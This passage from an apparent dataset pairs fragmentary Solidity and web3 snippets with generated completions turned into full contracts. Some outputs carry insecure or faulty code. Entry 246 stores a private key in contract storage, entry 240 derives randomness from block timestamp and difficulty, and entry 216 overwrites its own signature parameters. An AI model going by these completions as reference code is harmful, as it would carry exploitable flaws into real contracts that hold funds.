        "input": "pragma solidity ^0.8.13;\n\ncontract Auction {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    struct Campaign {\n        uint256 campaignID;\n        uint256 budget;\n        uint256 bidCount;\n        mapping(uint => Bidder[]) bidders;\n    }\n\n    struct Bidder {\n        bool bided;\n        uint256 bid;\n        string name;\n        address bidderAddress;\n    }\n\n    Campaign[] public campaigns;\n    uint totalCampaign = 0;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Error! You're not the smart contract owner!\");\n        _;\n    }\n\n    function createCampaing(uint _budgetCampaign) public onlyOwner {\n        Campaign storage _firstCampaigns = campaigns.push();\n        _firstCampaigns.campaignID = totalCampaign;\n        _firstCampaigns.budget = _budgetCampaign;\n        totalCampaign++;\n    }\n\n    function bid(uint _indexCampaign, string memory _nameBidder) public {\n        Campaign storage _bidCampaign = campaigns[_indexCampaign];\n        _bidCampaign.bidCount += 1;\n        uint _bidIndex = _bidCampaign.bidCount;\n        _bidCampaign.bidders[_indexCampaign].push(Bidder(true, _bidIndex, _nameBidder, msg.sender));\n    }\n\n    function getBids(uint _indexCampaign) onlyOwner external view returns(Bidder[] memory) {\n        return campaigns[_indexCampaign].bidders[_indexCampaign];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Auction {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    struct Campaign {\n        uint256 campaignID;\n        uint256 budget;\n        uint256 bidCount;\n    }\n\n    struct Bidder {\n        bool bided;\n        uint256 bid;\n        string name;\n        address bidderAddress;\n    }\n\n    mapping(uint => Campaign) public campaigns;\n    mapping(uint => Bidder[]) public bidders;\n    uint totalCampaign = 0;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Error! You're not the smart contract owner!\");\n        _;\n    }\n\n    function createCampaign(uint _budgetCampaign) public onlyOwner {\n        Campaign storage _firstCampaigns = campaigns[totalCampaign];\n        _firstCampaigns.campaignID = totalCampaign;\n        _firstCampaigns.budget = _budgetCampaign;\n        totalCampaign++;\n    }\n\n    function bid(uint _campaignID, string memory _nameBidder, uint _bid) public {\n        Campaign storage _bidCampaign = campaigns[_campaignID];\n        _bidCampaign.bidCount += 1;\n        bidders[_campaignID].push(Bidder(true, _bid, _nameBidder, msg.sender));\n    }\n\n    function getBids(uint _campaignID) onlyOwner external view returns(Bidder[] memory) {\n        return bidders[_campaignID];\n    }\n}\n\n",
        "changed": 0
    },
    "216.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract SignTest {\n\naddress owner = msg.sender;\n\nmapping(uint256 => bool) usedNonces;\n\nfunction test(uint256 amount, uint256 nonce, bytes memory sig, uint tV, bytes32 tR, bytes32 tS, bytes32 tMsg) public view returns(address) {\n\n    bytes32 message = prefixed(keccak256(abi.encodePacked(amount, nonce))); \n    bytes32 messageWithoutPrefix = keccak256(abi.encodePacked(amount, nonce)); \n\n   \n    address signer = recoverSigner(messageWithoutPrefix, sig, tV, tR,tS);\n\n    return signer;\n}\n\n\nfunction splitSignature(bytes memory sig)\n    public\n    view\n    returns (uint8, bytes32, bytes32)\n{\n    require(sig.length == 65, \"B\");\n\n    bytes32 r;\n    bytes32 s;\n    uint8 v;\n\n    assembly {\n        r := mload(add(sig, 32))\n        s := mload(add(sig, 64))\n        v := byte(0, mload(add(sig, 96)))\n    }\n\n    return (v, r, s);\n}\n\nfunction recoverSigner(bytes32 message, bytes memory sig, uint tV, bytes32 tR, bytes32 tS)\n    public\n    view\n    returns (address)\n{\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n\n    (v, r, s) = splitSignature(sig);\n\n    require(v==tV, \"V is not correct\");\n    require(r==tR, \"R is not correct\");\n    require(s==tS, \"S is not correct\");\n\n    return ecrecover(message, v, r, s);\n}\n\nfunction prefixed(bytes32 inputHash) public pure returns (bytes32) {\n    return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", inputHash));\n}\n\n}\n\n    let fnSignature = web3.utils.keccak256(\"setApprovalForAll(address,bool\").substr(0,10)\n\nlet fnParams = web3.eth.abi.encodeParameters(\n  [\"address\",\"bool\"],\n  [toAddr,permit]\n)\n\ncalldata = fnSignature + fnParams.substr(2)\n\nconsole.log(calldata)\n\nconst data = calldata \nconst NFTAddress = 'Contract address where you sign'\nconst newSigner = web3.eth.accounts.privateKeyToAccount(\"Your Priv Key\");\nconst myAccount = web3.eth.accounts.wallet.add(newSigner);\nconst signer = myAccount.address;\nconsole.log(signer) \n\n    let rawData = web3.eth.abi.encodeParameters(\n    ['address','bytes'],\n    [NFTAddress,data]\n  );\n  let hash = web3.utils.soliditySha3(rawData);\n  console.log(hash)\n  let signature = web3.eth.sign(hash, signer);\n console.log(signature)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SignTest {\n\n    address owner = msg.sender;\n\n    mapping(uint256 => bool) usedNonces;\n\n    function test(uint256 amount, uint256 nonce, bytes memory sig, uint8 v, bytes32 r, bytes32 s) public view returns(address) {\n\n        bytes32 message = prefixed(keccak256(abi.encodePacked(amount, nonce))); \n\n        address signer = recoverSigner(message, sig, v, r, s);\n\n        return signer;\n    }\n\n\n    function splitSignature(bytes memory sig)\n        public\n        view\n        returns (uint8, bytes32, bytes32)\n    {\n        require(sig.length == 65, \"Invalid signature length\");\n\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n\n        return (v, r, s);\n    }\n\n    function recoverSigner(bytes32 message, bytes memory sig, uint8 v, bytes32 r, bytes32 s)\n        public\n        view\n        returns (address)\n    {\n        (v, r, s) = splitSignature(sig);\n\n        return ecrecover(message, v, r, s);\n    }\n\n    function prefixed(bytes32 hash) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash));\n    }\n}\n\n",
        "changed": 0
    },
    "217.sol": {
        "input": "IBentoBoxMinimal(bentBox).setMasterContractApproval(\n               address(this), \n               _sushiswapTridentRouterAddress,\n               true,\n               0,\n               0,\n               0\n           );\n\n        IERC20Upgradeable(pool).safeIncreaseAllowance(\n            bentBox,\n           amountIn\n        );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IBentoBoxMinimal {\n    function setMasterContractApproval(address, address, bool, uint, uint, uint) external;\n}\n\n",
        "changed": 0
    },
    "218.sol": {
        "input": "function getContractOwner() public view returns (address)\n  {\n    return owner;\n  }\n\ncontract(\"YourContract\", (accounts) => {\n\n  let _contract = null;\n  let buyer = null;\n  before(async () => {\n    _contract = await YourContractName.deployed();\n    buyer = accounts[1];\n  });\n\n  describe(\"Normal withdraw\", () => {\n    let currentOwner = null;\n    before(async () => {\n      currentOwner = await _contract.getContractOwner();\n    });\n    it(\"should fail when withdrawing by different than owner address\", async () => {\n      const value = \"10000000000000000\";\n      _contract.withdraw(value, { from: buyer });\n    });\n}\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract YourContract {\n    address private owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function getContractOwner() public view returns (address) {\n        return owner;\n    }\n\n    function withdraw(uint amount) public {\n        require(msg.sender == owner, \"Can only be called by the contract owner\");\n        msg.sender.transfer(amount);\n    }\n\n    function() external payable {}\n}\n\n",
        "changed": 0
    },
    "221.sol": {
        "input": "const transaction = new ContractExecuteTransaction()\n        .setGas(2700000)\n        .setPayableAmount(100)\n        .setContractId(contractId)\n        .setFunctionParameters(functionParameters)\n        .setMaxTransactionFee(100);\n\nfunction mintToken() external payable {\n    (int responseCode, address _tokenAddress) = htsProxy.mintToken{value: msg.value}(\n        \"OraCRE\",\n        \"OraCRE\",\n        address(this),\n        1000000000,\n        8\n    );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public contractId;\n    bytes public functionParameters;\n    address payable public htsProxy;\n\n    constructor(address payable _htsProxy) public {\n        htsProxy = _htsProxy;\n    }\n\n    function setContractId(address _contractId) public {\n        contractId = _contractId;\n    }\n\n    function setFunctionParameters(bytes memory _functionParameters) public {\n        functionParameters = _functionParameters;\n    }\n\n    function executeTransaction() public payable {\n        require(msg.value >= 100, \"Insufficient funds sent\");\n        (bool success,) = contractId.call{value: msg.value, gas: 2700000}(functionParameters);\n        require(success, \"Failed to execute transaction\");\n    }\n\n    function mintToken() external payable {\n        (bool success, bytes memory data) = htsProxy.call{value: msg.value}(\n            abi.encodeWithSignature(\n                \"mintToken(string,string,address,uint256,uint8)\",\n                \"OraCRE\",\n                \"OraCRE\",\n                address(this),\n                1000000000,\n                8\n            )\n        );\n        require(success, \"Minting Token Failed\");\n    }\n}\n\n",
        "changed": 1
    },
    "223.sol": {
        "input": "function castVote(address _address) public {\n            votes[msg.sender] = _address;\n            Candidate storage candi = candidates[_address];\n            candi.numVotes = candi.numVotes + 1; \n        }\n\nfunction castVote(address _address) public {\n            votes[msg.sender] = _address;\n            Candidate memory candi = candidates[_address];\n            candi.numVotes = candi.numVotes + 1;\n            candidates[_address] = candi;\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n    struct Candidate {\n        uint numVotes;\n        string name;\n    }\n\n    mapping (address => Candidate) public candidates;\n    mapping (address => address) public votes;\n\n    function addCandidate(string memory _name) public {\n        candidates[msg.sender].name = _name;\n    }\n\n    function castVote(address _address) public {\n        require(_address != msg.sender, \"Candidates cannot vote for themselves\");\n\n        votes[msg.sender] = _address;\n        Candidate storage candi = candidates[_address];\n        candi.numVotes = candi.numVotes + 1;\n    }\n}\n\n",
        "changed": 0
    },
    "224.sol": {
        "input": "event TransferTimestamp(uint256 tokenId, address from, address to, uint256 timestamp);\n\nemit TransferTimestamp(tokenId, msg.sender, to, block.timestamp);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event TransferTimestamp(uint256 tokenId, address from, address to, uint256 timestamp);\n\n    function transferToken(uint256 tokenId, address to) public {\n        // Logic for token transfer, this is just an example\n        // You would normally interact with an ERC20/ERC721 contract here\n        // Make sure msg.sender owns the token before trying to transfer it\n\n        emit TransferTimestamp(tokenId, msg.sender, to, block.timestamp);\n    }\n}\n\n",
        "changed": 0
    },
    "225.sol": {
        "input": "uint256 mask = uint256(int256(-1));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public mask;\n\n    constructor() {\n        mask = uint256(int256(-1));\n    }\n}\n\n",
        "changed": 0
    },
    "226.sol": {
        "input": "function addRecord(address _addr, Records memory record) public {\n}\n\nfunction addRecord(address _addr, string memory cname, string memory l_cadence, string memory r_cadence, string memory n_cadence, string memory l_dsupport,\n     string memory r_dsupport, string memory n_dsupport, string memory l_footoff, string memory r_footoff, string memory n_footoff, string memory l_steptime, \n     string memory r_steptime, string memory n_steptime, string memory admittedOn, string memory dischargedOn, string memory ipfs) internal {\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RecordContract {\n    struct Record {\n        string cname;\n        string l_cadence;\n        string r_cadence;\n        string n_cadence;\n        string l_dsupport;\n        string r_dsupport;\n        string n_dsupport;\n        string l_footoff;\n        string r_footoff;\n        string n_footoff;\n        string l_steptime;\n        string r_steptime;\n        string n_steptime;\n        string admittedOn;\n        string dischargedOn;\n        string ipfs;\n    }\n\n    mapping(address => Record) private records;\n\n    function addRecord(address _addr, Record memory record) public {\n        records[_addr] = record;\n    }\n\n    function addRecord(address _addr, string memory cname, string memory l_cadence, string memory r_cadence, string memory n_cadence, string memory l_dsupport,\n         string memory r_dsupport, string memory n_dsupport, string memory l_footoff, string memory r_footoff, string memory n_footoff, string memory l_steptime, \n         string memory r_steptime, string memory n_steptime, string memory admittedOn, string memory dischargedOn, string memory ipfs) internal {\n        records[_addr] = Record(cname, l_cadence, r_cadence, n_cadence, l_dsupport, r_dsupport, n_dsupport, l_footoff, r_footoff, n_footoff, l_steptime, r_steptime, n_steptime, admittedOn, dischargedOn, ipfs);\n    }\n}\n\n",
        "changed": 0
    },
    "228.sol": {
        "input": "function registerAsset(\n    external function\n        string memory description,\n        uint256 price,\n        uint256 shares\n    ) external onlyOwner {\n        require(shares > 0, \"Shares must be greater than 0.\");\n        assetCount++;\n        assets[assetCount] = Asset(msg.sender, description, price, shares);\n        emit RegisterAsset(description, price, shares);\n    }\n\nfunction setAssetPrice(\n        uint256 assetId,\n        uint256 newPrice\n    ) external onlyOwner {\n        require(assetId > 0 && assetId <= assetCount, \"Invalid asset ID.\");\n        Asset storage asset = assets[assetId];\n        require(asset.owner != address(0), \"Asset does not exist.\");\n        asset.pricePerShare = newPrice;\n\n        emit SetAssetPrice(assetId, newPrice);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AssetRegistry {\n    address public owner;\n    uint256 public assetCount = 0;\n\n    struct Asset {\n        address owner;\n        string description;\n        uint256 pricePerShare;\n        uint256 shares;\n    }\n\n    mapping(uint256 => Asset) public assets;\n\n    event RegisterAsset(\n        string description,\n        uint256 price,\n        uint256 shares\n    );\n\n    event SetAssetPrice(\n        uint256 assetId,\n        uint256 newPrice\n    );\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not owner\");\n        _;\n    }\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function registerAsset(\n        string memory description,\n        uint256 price,\n        uint256 shares\n    ) external onlyOwner {\n        require(shares > 0, \"Shares must be greater than 0.\");\n        assetCount++;\n        assets[assetCount] = Asset(msg.sender, description, price, shares);\n        emit RegisterAsset(description, price, shares);\n    }\n\n    function setAssetPrice(\n        uint256 assetId,\n        uint256 newPrice\n    ) external onlyOwner {\n        require(assetId > 0 && assetId <= assetCount, \"Invalid asset ID.\");\n        Asset storage asset = assets[assetId];\n        require(asset.owner != address(0), \"Asset does not exist.\");\n        asset.pricePerShare = newPrice;\n        emit SetAssetPrice(assetId, newPrice);\n    }\n}\n\n",
        "changed": 0
    },
    "229.sol": {
        "input": "function stakeTokens(uint256 _amount,address _token) public{\n        require(_amount>0,\"Amount must be more than 0\");\n    \n        IERC20(_token).transferFrom(msg.sender,address(this),_amount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function stakeTokens(uint256 _amount, address _token) public {\n        require(_amount > 0, \"Amount must be more than 0\");\n        IERC20(_token).transferFrom(msg.sender, address(this), _amount);\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n}\n\n",
        "changed": 0
    },
    "230.sol": {
        "input": "contract Called {\n    event Received(uint256 amount);\n\n    fallback() external payable {\n        emit Received(msg.value);\n\n        msg.sender.call(\"\");\n    }\n}\n\n\n",
        "output": "contract Called {\n    event Received(uint256 amount);\n\n    fallback() external payable {\n        // ok\n        emit Received(msg.value);\n\n        // fail - costs more than the 2300 limit\n        msg.sender.call(\"\");\n    }\n}\n\n",
        "changed": 0
    },
    "231.sol": {
        "input": "uint[] IntArrayTest;\n\nfunction addElements(uint _number) public{\n    Numbers memory numbers = Numbers(_number);\n    IntArrayTest.push(numbers._number);\n    elementsCounter +=1;\n}\n\nstruct Numbers{\n    uint _number;\n}\n\nNumbers[] NumbersArrayTest;\n\nfunction addElements(uint _number) public{\n    NumbersArrayTest.push(Numbers(_number));\n    elementsCounter +=1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ArrayTest {\n    uint[] IntArrayTest;\n    uint public elementsCounter;\n    struct Numbers{\n        uint _number;\n    }\n    Numbers[] NumbersArrayTest;\n\n    function addElementsIntArray(uint _number) public{\n        IntArrayTest.push(_number);\n        elementsCounter +=1;\n    }\n\n    function addElementsNumbersArray(uint _number) public{\n        NumbersArrayTest.push(Numbers(_number));\n        elementsCounter +=1;\n    }\n}\n\n",
        "changed": 0
    },
    "232.sol": {
        "input": "function withdraw (uint wdraw_amt) public view returns(string memory error){\n    if(wdraw_amt<=balance){\n     balance -= wdraw_amt;    \n    }\n\nfunction withdraw (uint wdraw_amt) public returns(string memory error){\n\nfunction withdraw(uint wdraw_amt) public {\n    if (wdraw_amt <= balance) {\n        balance -= wdraw_amt;\n    } else {\n        revert(\"Insufficient Balance\");\n    }\n}\n\nevent Error(string _message);\n\nfunction withdraw(uint wdraw_amt) public {\n    if (wdraw_amt <= balance) {\n        balance -= wdraw_amt;\n    } else {\n        emit Error(\"Insufficient Balance\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint public balance;\n    event Error(string _message);\n\n    constructor() {\n        balance = 0;\n    }\n\n    function deposit(uint deposit_amt) public {\n        balance += deposit_amt;\n    }\n\n    function withdraw(uint wdraw_amt) public {\n        if (wdraw_amt <= balance) {\n            balance -= wdraw_amt;\n        } else {\n            emit Error(\"Insufficient Balance\");\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "233.sol": {
        "input": "address public curve = 0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public curve = 0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5;\n\n    function setCurve(address _curve) public {\n        curve = _curve;\n    }\n\n    function getCurve() public view returns (address) {\n        return curve;\n    }\n}\n\n",
        "changed": 0
    },
    "234.sol": {
        "input": "uint256[] memory points;\n\nfunction _generateXPoints(uint256 pointsCount) public view returns (uint256[] memory) {\n    uint256[] memory points = new uint256[](pointsCount);\n\n    for(uint256 i; i < pointsCount; i++) {\n      points[i] = 1;\n    }\n\n    return points;\n}\n\nuint256[][1] memory points;\npoints[0] = new uint256[](pointsCount);\n\nfunction generatePoints(uint256 pointsCount) public view returns (uint256[][1] memory) {\n    uint256[][1] memory points;\n    points[0] = new uint256[](pointsCount);\n    for(uint256 i; i < pointsCount; i++) {\n        points[0][i] = 1;\n    }\n\n    return points;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PointsGenerator {\n    uint256[] public points;\n\n    function _generateXPoints(uint256 pointsCount) public view returns (uint256[] memory) {\n        uint256[] memory points = new uint256[](pointsCount);\n\n        for(uint256 i; i < pointsCount; i++) {\n            points[i] = 1;\n        }\n\n        return points;\n    }\n\n    uint256[][1] public pointsArray;\n\n    function generatePoints(uint256 pointsCount) public view returns (uint256[][1] memory) {\n        uint256[][1] memory points;\n        points[0] = new uint256[](pointsCount);\n        for(uint256 i; i < pointsCount; i++) {\n            points[0][i] = 1;\n        }\n\n        return points;\n    }\n}\n\n",
        "changed": 0
    },
    "236.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract Test is Ownable {\n\n    function heresHowYouUseIt() public onlyOwner {\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "237.sol": {
        "input": "for (uint256 i = 1; i <= _mintAmount; i++)\n\n\n",
        "output": "",
        "changed": 0
    },
    "238.sol": {
        "input": "simpleStorageArray.push(simpleStorage2);\n\npragma solidity ^0.6.0;\n\nimport \"./SimpleStorage.sol\";\n\ncontract StorageFactory {\n\n    SimpleStorage[] public simpleStorageArray;\n    SimpleStorage public simpleStorage2 = new SimpleStorage();\n\n    function createSimpleStorageContract() public {\n        SimpleStorage simpleStorage = new SimpleStorage();\n        simpleStorageArray.push(simpleStorage);\n        simpleStorageArray.push(simpleStorage2);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "239.sol": {
        "input": "modifier onlyOwner() {\n    require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function _msgSender() internal view returns (address payable) {\n        return msg.sender;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n",
        "changed": 0
    },
    "240.sol": {
        "input": " function generateRandomNumber(address _random) external(bytes32 requestId) {\n        randomness_interface(_random).fulfillRandomness(uint256);\n    }\n\n  function fulfillRandomness(bytes32 requestId, uint256 randomness) \n\nfunction generateRandomNumber(address _random) external(bytes32 requestId) {\n        randomness_interface(_random).fulfillRandomness(uint256);\n    }\n\nfunction fulfillRandomness(bytes32 requestId,uint256 randomNumber) internal override{\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IRandomness {\n    function fulfillRandomness(bytes32 requestId, uint256 randomness) external;\n}\n\ncontract RandomNumberGenerator {\n\n    IRandomness public randomness_interface;\n\n    constructor(address _randomnessAddress) public {\n        randomness_interface = IRandomness(_randomnessAddress);\n    }\n\n    function generateRandomNumber(bytes32 requestId) external {\n        randomness_interface.fulfillRandomness(requestId, uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))));\n    }\n\n    function fulfillRandomness(bytes32 requestId, uint256 randomNumber) internal {\n        // This function should be overridden in derived contracts\n    }\n}\n\n",
        "changed": 0
    },
    "241.sol": {
        "input": "encode_data  [type=\"ethabiencode\" abi=\"(bytes32 requestId, uint256[][] value)\" data=\"{ \\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"value\\\\\": $(parse) }\"]\n\ntype = \"directrequest\"\nschemaVersion = 1\nname = \"shamba-fire-data\"\ncontractAddress = \"0xf4434feDd55D3d6573627F39fA39867b23f4Bf7F\"\nmaxTaskDuration = \"0s\"\nobservationSource = \"\"\"\n    decode_log   [type=\"ethabidecodelog\"\n                  abi=\"OracleRequest(bytes32 indexed specId, address requester, bytes32 requestId, uint256 payment, address callbackAddr, bytes4 callbackFunctionId, uint256 cancelExpiration, uint256 dataVersion, bytes data)\"\n                  data=\"$(jobRun.logData)\"\n                  topics=\"$(jobRun.logTopics)\"]\n\n    decode_cbor  [type=\"cborparse\" data=\"$(decode_log.data)\"]\n    fetch        [type=\"bridge\" name=\"shamba-fire-bridge\" requestData=\"{\\\\\"id\\\\\": $(jobSpec.externalJobID), \\\\\"data\\\\\":$(decode_cbor.data)}\"]\n    parse        [type=\"jsonparse\" path=\"result\" data=\"$(fetch)\"]\n    encode_data  [type=\"ethabiencode\" abi=\"(bytes32 requestId, uint256[][] value)\" data=\"{ \\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"value\\\\\": $(parse) }\"]\n    encode_tx    [type=\"ethabiencode\"\n                  abi=\"fulfillOracleRequest2(bytes32 requestId, uint256 payment, address callbackAddress, bytes4 callbackFunctionId, uint256 expiration, bytes calldata data)\"\n                  data=\"{\\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"payment\\\\\": $(decode_log.payment), \\\\\"callbackAddress\\\\\": $(decode_log.callbackAddr), \\\\\"callbackFunctionId\\\\\": $(decode_log.callbackFunctionId), \\\\\"expiration\\\\\": $(decode_log.cancelExpiration), \\\\\"data\\\\\": $(encode_data)}\"\n                 ]\n    submit_tx    [type=\"ethtx\" to=\"0xf4434feDd55D3d6573627F39fA39867b23f4Bf7F\" data=\"$(encode_tx)\"]\n\n    decode_log -> decode_cbor -> fetch -> parse -> encode_data -> encode_tx -> submit_tx\n\"\"\"\nexternalJobID = \"66229880-79e1-43c6-9d9e-0eb4b668729d\"\n\npragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/ChainlinkClient.sol\";\n\ncontract GenericLargeResponse is ChainlinkClient {\n  using Chainlink for Chainlink.Request;\n\n  uint256[][] public data;\n\n  constructor(\n  ) {\n    setChainlinkToken(0xa36085F69e2889c224210F603D836748e7dC0088);\n    setChainlinkOracle(0xf4434feDd55D3d6573627F39fA39867b23f4Bf7F);\n  }\n\n  function requestBytes(\n  )\n    public\n  {\n    bytes32 specId = \"6622988079e143c69d9e0eb4b668729d\";\n    uint256 payment = 1000000000000000000;\n    Chainlink.Request memory req = buildChainlinkRequest(specId, address(this), this.fulfillBytes.selector);\n    req.add(\"data\", \"{\\\"agg_x\\\": \\\"agg_mean\\\", \\\"dataset_code\\\":\\\"MODIS/006/MOD14A1\\\", \\\"selected_band\\\":\\\"MaxFRP\\\", \\\"image_scale\\\":1000, \\\"start_date\\\":\\\"2021-09-01\\\", \\\"end_date\\\":\\\"2021-09-10\\\", \\\"geometry\\\":{\\\"type\\\":\\\"FeatureCollection\\\",\\\"features\\\":[{\\\"type\\\":\\\"Feature\\\",\\\"properties\\\":{\\\"id\\\":1},\\\"geometry\\\":{\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[29.53125,19.642587534013032],[29.53125,27.059125784374068],[39.90234375,27.059125784374068],[39.90234375,19.642587534013032],[29.53125,19.642587534013032]]]}},{\\\"type\\\":\\\"Feature\\\",\\\"properties\\\":{\\\"id\\\":2},\\\"geometry\\\":{\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[46.40625,13.752724664396988],[46.40625,20.138470312451155],[56.25,20.138470312451155],[56.25,13.752724664396988],[46.40625,13.752724664396988]]]}}]}}\");\n       \n    sendOperatorRequest(req, payment);\n  }\n\n  function fulfillBytes(\n    bytes32 requestId,\n    uint256[][] memory bytesData\n  )\n    public\n    recordChainlinkFulfillment(requestId)\n  {\n    data = bytesData;\n  }\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "242.sol": {
        "input": " function setter() public {\n   data1[p1.add].amount=7;\n } \n\n\n",
        "output": "",
        "changed": 0
    },
    "243.sol": {
        "input": "token.transferFrom(msg.sender, address(this), _amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 public token;\n\n    constructor(IERC20 _token) public {\n        token = _token;\n    }\n\n    function transferToContract(uint256 _amount) public returns (bool) {\n        bool result = token.transferFrom(msg.sender, address(this), _amount);\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "244.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n\n    address oracle = address(0x123);\n\n    function requestNFTOwnerCheck(address owner, address collection, uint256 tokenID, uint16 chainID) external {\n        (bool success, ) = oracle.call(abi.encode(owner, collection, tokenID, chainID));\n        require(success);\n    }\n\n    function callback(bool result) external {\n        require(msg.sender == oracle, \"This function can be invoked only by the oracle\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    // TODO implement a way to keep track of the requests\n    // so that you can pair the incoming result to its according request data\n\n    address oracle = address(0x123);\n\n    function requestNFTOwnerCheck(address owner, address collection, uint256 tokenID, uint16 chainID) external {\n        (bool success, ) = oracle.call(abi.encode(owner, collection, tokenID, chainID));\n        require(success);\n    }\n\n    function callback(bool result) external {\n        require(msg.sender == oracle, \"This function can be invoked only by the oracle\");\n    }\n}\n\n",
        "changed": 0
    },
    "246.sol": {
        "input": "function payment (address payable beneficiary) payable external{\n  uint256 amount = msg.value;\n  beneficiary.transfer(amount);\n}\n\nfunction payment(e){\n e.preventDefault();\n const nonce = await web3.eth.getTransactionCount(myAddress, 'latest');\n const data = project.methods.payment('0xe13DC66579940552574Cbe795410423609C2BFd9').encodeABI();\n   \n     }\nconst transaction = {\n 'to': 'contract Address',\n 'value': 100000000000000000, \n 'gas': 30000,\n 'maxFeePerGas': 1000000108,\n 'nonce': nonce,\n};\nconst signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);\n\nweb3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {\nif (!error) {\n  console.log(\"\ud83c\udf89 The hash of your transaction is: \", hash, \"\\n Check Alchemy's Mempool to view the status of your transaction!\");\n} else {\n  console.log(\"\u2757Something went wrong while submitting your transaction:\", error)\n}\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address myAddress;\n    string PRIVATE_KEY;\n    address project;\n\n    constructor(address _myAddress, string memory _PRIVATE_KEY, address _project) {\n        myAddress = _myAddress;\n        PRIVATE_KEY = _PRIVATE_KEY;\n        project = _project;\n    }\n\n    function payment(address payable beneficiary) payable external {\n        uint256 amount = msg.value;\n        beneficiary.transfer(amount);\n    }\n\n    function sendTransaction() external {\n        // This part would usually be handled by your front-end, not in the smart contract itself\n        // e.preventDefault();\n        // const nonce = await web3.eth.getTransactionCount(myAddress, 'latest');\n        // const data = project.methods.payment('0xe13DC66579940552574Cbe795410423609C2BFd9').encodeABI();\n\n        // const transaction = {\n        //     'to': 'contract Address',\n        //     'value': 100000000000000000, \n        //     'gas': 30000,\n        //     'maxFeePerGas': 1000000108,\n        //     'nonce': nonce\n        // };\n        // const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);\n\n        // web3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {\n        //     if (!error) {\n        //         console.log(\"\ud83c\udf89 The hash of your transaction is: \", hash, \"\\n Check Alchemy's Mempool to view the status of your transaction!\");\n        //     } else {\n        //         console.log(\"\u2757Something went wrong while submitting your transaction:\", error);\n        //     }\n        // });\n    }\n}\n\n",
        "changed": 0
    },
    "247.sol": {
        "input": "function returnStaked (address addressStaked) public view returns (Stakes[] memory) {\n   return addressToStaked[addressStaked];\n}\n\n\n\n",
